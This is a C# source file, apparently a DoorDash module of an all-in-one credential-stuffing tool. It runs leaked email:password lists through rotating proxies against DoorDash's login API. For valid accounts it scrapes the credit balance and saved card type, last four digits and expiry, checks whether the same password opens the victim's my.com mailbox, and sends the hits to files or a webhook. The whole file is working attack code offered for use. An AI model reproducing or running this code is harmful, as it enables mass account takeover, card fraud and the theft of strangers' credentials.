using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class DoorDashmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var str1 = "email=" + array[0] + "&password=" + array[1];
                            req.SslCertificateValidatorCallback += (obj, cert, ssl, error) =>
                                (cert as X509Certificate2).Verify();
                            var str2 = req.Post("https://api.doordash.com/v2/auth/web_login/", str1,
                                "application/x-www-form-urlencoded").ToString();
                            if (!str2.Contains("Incorrect username or password"))
                            {
                                if (str2.Contains("last_name"))
                                {
                                    if (str2.Contains("account_credits\":0"))
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Doordash_frees",
                                            array[0] + ":" + array[1] + " | Balance: 0.00");
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("DoorDash",
                                                array[0] + ":" + array[1] + " | Balance: 0.00");
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1] + " | Balance: 0.00",
                                                "DoorDash Free");
                                    }

                                    var num = double.Parse(
                                        Regex.Match(str2, "account_credits\":(.*?),").Groups[1].Value);
                                    var str3 = Parse(str2, "\",\"type\":\"", "\",");
                                    var str4 = Parse(str2, "exp_year\":\"", "\",");
                                    var str5 = Parse(str2, "exp_month\":\"", "\",");
                                    var str6 = Parse(str2, "last4\":\"", "\",");
                                    var str7 = " | Balance: $" + num / 100.0 + " | CC: " + str3 + "|" + str6 + "|" +
                                               str5 + "/" + str4;
                                    Parse(str2, "\"account_credits\":", ",");
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    var type = "NFA";

                                    if (MailAccessCheck(array[0], array[1]) == "Working") type = "MFA";

                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Door Dash", array[0] + ":" + array[1] + str7 + " | " + type);
                                    Export.AsResult("/Doordash_hits", array[0] + ":" + array[1] + str7 + " | " + type);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1] + str7 + " | " + type,
                                            "Door Dash");
                                }
                            }
                            else if (str2.Contains("Incorrect username or password"))
                            {
                                Program.TotalChecks++;
                                Program.Fails++;
                                req.Dispose();
                            }
                            else
                            {
                                Program.Combos.Add(text);
                                req.Dispose();
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string MailAccessCheck(string email, string password)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";

                        var strResponse = req.Get(new Uri(
                                $"https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login={email}&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password={password}&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&"))
                            .ToString();

                        if (strResponse.Contains("Ok=1")) return "Working";
                        break;
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}